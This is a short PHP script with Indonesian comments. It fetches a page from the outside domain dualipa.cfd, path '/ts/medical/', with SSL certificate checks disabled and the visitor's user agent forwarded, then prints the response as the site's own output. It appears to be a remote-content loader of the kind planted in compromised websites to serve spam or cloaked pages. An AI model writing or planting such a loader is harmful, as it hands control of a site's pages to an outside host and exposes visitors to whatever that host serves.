        <?php



        $url = "https://dualipa.cfd/ts/medical/";



        // Inisialisasi cURL

        $ch = curl_init();



        // Setting cURL

        curl_setopt($ch, CURLOPT_URL, $url);

        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);

        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);

        curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);



        // Eksekusi request

        $response = curl_exec($ch);



        // Cek error

        if (curl_errno($ch)) {

            http_response_code(500);

            echo "Error: " . curl_error($ch);

            curl_close($ch);

            exit;

        }



        // Tutup koneksi

        curl_close($ch);



        // Tampilkan hasil

        echo $response;



        ?>
